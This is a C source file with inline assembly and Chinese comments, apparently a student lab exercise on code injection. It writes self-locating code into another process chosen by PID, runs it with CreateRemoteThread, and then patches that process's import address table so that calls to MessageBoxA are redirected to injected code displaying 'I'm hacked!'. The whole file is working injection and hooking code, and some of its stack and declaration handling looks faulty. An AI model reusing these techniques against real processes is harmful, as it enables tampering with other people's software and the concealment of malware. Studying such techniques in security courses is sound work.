//inj.c
#include <windows.h>
#pragma comment(lib,"user32.lib")
PBYTE pRemoteCode, pCode, pCode2, pOrignCode;
DWORD dwSizeOfCode;
//DWORD addrFunction,addrIAFuntion;

DWORD  GetIAFromImportTable(DWORD dwBase,LPCSTR lpszFuncName);
void _str_msgboxa();
void _addr_GetModuleHandleA();
void _addr_MessageBoxA();

void MyMessageBox();
// code_start是二进制码的开始标记
__declspec(naked) void code_start()
{
    __asm {
        push ebp
        mov  ebp, esp
        push ebx
				//Local variables
        sub  esp, 0x10
        // ebp - 0x0C ===> ImageBase
				// self-locating 自定位 请阅读并理解下面3条指令的含义
        call _delta
_delta:
        pop  ebx
        sub  ebx, offset _delta
				// 调用GetModuleHandleA()
        push 0
        lea  ecx, [ebx + _addr_GetModuleHandleA]
        call dword ptr [ecx]
        cmp  eax, 0x0
        jne  _cont1
        mov  eax, 0x1
        jmp  _ret
_cont1:
        mov  [ebp-0x0C], eax
				// 调用GetIAFromImportTable();
        lea  ecx, [ebx + _str_msgboxa]
        push ecx
        push [ebp-0x0C]
        call offset GetIAFromImportTable
        add  esp, 0x8
        cmp  eax, 0x0
        jne  _ret
        mov  eax, 0x2
_ret:
        add  esp, 0x20
        pop  ebx
        mov  esp, ebp
        pop  ebp
        ret
    }
}
// _str_msgboxa是字符串”MessageBoxA”的地址
__declspec(naked) void _str_msgboxa()
{
    __asm {
        _emit 'M'
        _emit 'e'
        _emit 's'
        _emit 's'
        _emit 'a'
        _emit 'g'
        _emit 'e'
        _emit 'B'
        _emit 'o'
        _emit 'x'
        _emit 'A'
        _emit 0x0
    }
}
// _addr_GetModuleHandleA是存放GetModuleHandleA()的全局变量 待填
__declspec(naked) void _addr_GetModuleHandleA()
{
    __asm {
        _emit 0xAA
        _emit 0xBB
        _emit 0xAA
        _emit 0xEE
    }
}
// 这里请填入GetIAFromImportTable()函数的相关代码

DWORD  GetIAFromImportTable(DWORD dwBase,LPCSTR lpszFuncName){
	PIMAGE_DOS_HEADER 			pDosHeader;
  PIMAGE_NT_HEADERS 			pNtHeaders;
  PIMAGE_FILE_HEADER 			pFileHeader;
  PIMAGE_OPTIONAL_HEADER32 	pOptHeader;
  DWORD dwRVAImpTBL;
  DWORD dwSizeOfImpTBL;
  PIMAGE_IMPORT_DESCRIPTOR pImpTBL,p;
  PIMAGE_IMPORT_BY_NAME pOrdName;
  DWORD dwRVAName;
  PIMAGE_THUNK_DATA thunkTargetFunc;
  WORD hint;
  
  
  DWORD dwIA=0;
  pDosHeader = (PIMAGE_DOS_HEADER)dwBase;
  pNtHeaders = (PIMAGE_NT_HEADERS)(dwBase + pDosHeader->e_lfanew);
  pOptHeader = &(pNtHeaders->OptionalHeader);
  dwRVAImpTBL = pOptHeader->DataDirectory[1].VirtualAddress;
  dwSizeOfImpTBL = pOptHeader->DataDirectory[1].Size;
  pImpTBL = (PIMAGE_IMPORT_DESCRIPTOR)(dwBase + dwRVAImpTBL);
  for (p = pImpTBL; (DWORD)p < ((DWORD)pImpTBL + dwSizeOfImpTBL); p++){
    	//dwRVAName=p->Name;//dwRVAName是该描述符的name属性，为RVA
    	thunkTargetFunc=(PIMAGE_THUNK_DATA)GetIAFromImpDesc(dwBase,lpszFuncName,p);
    	if(!thunkTargetFunc){
    		continue;
    		}
    		else{
    			//printf("0x%08x ==> 0x%08x\n",&(thunkTargetFunc->u1.Function),thunkTargetFunc->u1.Function);
    			//addrIAFuntion=thunkTargetFunc->u1.Function;//Function的值，即入口地址
    			//addrFunction=&(thunkTargetFunc->u1.Function);//IAT里面function所在的地址
    			//return thunkTargetFunc;
    			return &(thunkTargetFunc->u1.Function);
    			}	
    }
    
    return 0;
	}
	
	
	
DWORD GetIAFromImpDesc(DWORD dwBase, LPCSTR lpszName,PIMAGE_IMPORT_DESCRIPTOR pImpDesc) 
{
    PIMAGE_THUNK_DATA pthunk, pthunk2;
    PIMAGE_IMPORT_BY_NAME pOrdinalName;
    if (pImpDesc->Name == 0) return 0;
    pthunk = (PIMAGE_THUNK_DATA) (dwBase + pImpDesc->OriginalFirstThunk);
    pthunk2 = (PIMAGE_THUNK_DATA) (dwBase + pImpDesc->FirstThunk);
    for (; pthunk->u1.Function != 0; pthunk++, pthunk2++) {
        if (pthunk->u1.Ordinal & 0x80000000) continue;//如果是序号值就跳过
        pOrdinalName = (PIMAGE_IMPORT_BY_NAME) (dwBase + pthunk->u1.AddressOfData);//AddressOfData指向imageImportByName结构的RVA
        if (CompStr((LPSTR)lpszName, (LPSTR)&pOrdinalName->Name)) 
            return (DWORD)pthunk2;
    }
    return 0;
}
BOOL CompStr(LPSTR s1, LPSTR s2)
{
    PCHAR p, q;
    for (p = s1, q = s2; (*p != 0) && (*q != 0); p++, q++) {
        if (*p != *q) return FALSE;
    }
    return TRUE;
}

// code_end是二进制码的结束标记
__declspec(naked) void code_end()
{
    __asm _emit 0xCC
}
__declspec(naked) void MyMessageBoxA()
{
    __asm {
        push ebp
        mov  ebp, esp
        push ebx
        
        call _delta2
_delta2:
        pop ebx
        sub ebx, offset _delta2
        
        push [ebp + 0x14]
        push [ebp + 0x10]
        lea  ecx, [ebx + _str_hacked]
        push ecx
        push [ebp + 0x08]
        lea  eax, [ebx + _addr_MessageBoxA]   //need relocation
        call dword ptr [eax]
        pop  ebx
        mov  esp, ebp
        pop  ebp
        ret  16
_str_hacked:
        _emit 'I'
        _emit '\''
        _emit 'm'
        _emit ' '
        _emit 'h'
        _emit 'a'
        _emit 'c'
        _emit 'k'
        _emit 'e'
        _emit 'd'
        _emit '!'
        _emit 0x0
   }
}

__declspec(naked) void _addr_MessageBoxA()
{
    __asm
    {
        _emit 0xAA
        _emit 0xBB
        _emit 0xAA
        _emit 0xDD
    }
}
// make_code()函数是将开始标记和结束标记之间的所有二进制数据拷贝到一个缓冲区中
DWORD make_code()
{
    int off; 
    DWORD func_addr;
    HMODULE hModule;
    __asm {
        mov edx, offset code_start
        mov dword ptr [pOrignCode], edx
        mov eax, offset code_end
        sub eax, edx
        mov dword ptr [dwSizeOfCode], eax
    }
    pCode = VirtualAlloc(NULL, dwSizeOfCode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pCode== NULL) {
        printf("[E]: VirtualAlloc failed\n");
        return 0;
    }
    printf("[I]: VirtualAlloc ok --> at 0x%08x.\n", pCode);
    for (off = 0; off<dwSizeOfCode; off++) {
        *(pCode+off) = *(pOrignCode+off);
    }
    printf("[I]: Copy code ok --> from 0x%08x to 0x%08x with size of 0x%08x.\n", 
        pOrignCode, pCode, dwSizeOfCode);
    hModule = LoadLibrary("kernel32.dll");
    if (hModule == NULL) {
        printf("[E]: kernel32.dll cannot be loaded. \n");
        return 0;
    }
    func_addr = (DWORD)GetProcAddress(hModule, "GetModuleHandleA");
    if (func_addr == 0) {
        printf("[E]: GetModuleHandleA not found. \n");
        return 0;
    }
    off = (DWORD)pCode - (DWORD)pOrignCode;
    *(PDWORD)((PBYTE)_addr_GetModuleHandleA + off) = func_addr;//填入GetModuleHandleA
    return dwSizeOfCode;
}


// inject_code()函数是存放在pCode所指向的缓冲区中的二进制代码注入到远程进程中
int inject_code(DWORD pid)
{
    DWORD sizeInjectedCode,sizeInjectedCode2;
    DWORD hproc,hthread;
    DWORD addrMsgBoxA,enterAddrMsgBoxA;
    int rcode,TID,num,old,rcode2;
    
    sizeInjectedCode=make_code();//将代码编译并拷贝入新的区域，返回代码长度
    hproc = OpenProcess(
          PROCESS_CREATE_THREAD  | PROCESS_QUERY_INFORMATION
        | PROCESS_VM_OPERATION   | PROCESS_VM_WRITE 
        | PROCESS_VM_READ, FALSE, pid);//创建远程进程句柄
        
    rcode=(PBYTE)VirtualAllocEx(hproc,0,sizeInjectedCode,MEM_COMMIT,PAGE_EXECUTE_READWRITE);//open the space in remote process
		if(!WriteProcessMemory(hproc, rcode, pCode, sizeInjectedCode, &num)){//写入代码
			printf("[E]Write pCode Failed\n");
			}else 
			{
			printf("[I]Write pCode Success\n");
			}
		hthread = CreateRemoteThread(hproc,NULL, 0, (LPTHREAD_START_ROUTINE)rcode,0, 0 , &TID);//创建线程
		WaitForSingleObject(hthread, 0xffffffff);//异步等待
		if(!GetExitCodeThread(hthread, &addrMsgBoxA)){//获取返回值
  		printf("[E]Get exitCode Failed\n");
  		}else 
  		{
  		printf("[I]Get exitCode Success\n");
  		}
		printf("The address of MsgBoxA is 0x%08x\n",addrMsgBoxA);//打印
		
		//读取addrMsgBoxA地址中的值，并获取其中的MsgBoxA的入口地址
		if(!ReadProcessMemory(hproc, addrMsgBoxA, &enterAddrMsgBoxA, 4, &num)){//写入代码
			printf("[E]Read Addr Failed\n");
			}else 
			{
			printf("[I]Read Addr Success\n");
			}
		//将入口地址填入以上内存单元
		 if(!VirtualProtect(_addr_MessageBoxA, 4, PAGE_EXECUTE_READWRITE, &old)){
		//修改代码段为可写
			printf("[E]Change to be Writable Failed\n");
		}else 
		{
			printf("[I]Change to be Writable Success\n");
		}
		*(PDWORD)((PBYTE)_addr_MessageBoxA)=enterAddrMsgBoxA;//代码段不可写，就这意思
		pCode2=(PBYTE)MyMessageBoxA;
		
		rcode2=(PBYTE)VirtualAllocEx(hproc,0,200,MEM_COMMIT,PAGE_EXECUTE_READWRITE);//open the space in remote process 由于不确定那段代码多少长，为了偷懒，申请了远大于代码实际长度的值200，不过应该没问题
		if(!WriteProcessMemory(hproc, rcode2,pCode2, 200, &num)){//写入代码 num中填的事实际长度
			printf("[E]Write pCode2 Failed\n");
			}else 
			{
			printf("[I]Write pCode2 Success\n");
			}
		//修改addrMsgBoxA内存单元内的值
		if(!VirtualProtectEx( hproc,addrMsgBoxA, 4, PAGE_EXECUTE_READWRITE, &old)){ 
		//修改代码段为可写
			printf("[E]Change to be Writable Failed\n");
		}else 
		{
			printf("[I]Change to be Writable Success\n");
		}
		if(!WriteProcessMemory(hproc, addrMsgBoxA,&rcode2, 4, &num)){//写入代码 rcode要取地址，否则无法获得其中的值
			printf("[E]Write pCode2 Failed\n");
			}else 
			{
			printf("[I]Write pCode2 Success\n");
			}
		
			
    return 0;
}
int main(int argc, char *argv[])
{
    DWORD pid = 0;
    // 为pid赋值为hello.exe的进程ID
    if (argc < 2) {
        printf("Usage: %s pid\n", argv[0]);
        return -1;
    }
    pid = atoi(argv[1]);
		if (pid <= 0) {
        	printf("[E]: pid must be positive (pid>0)!\n"); 
        	return -2;
		}  
    
    inject_code(pid);
    return 0;
  }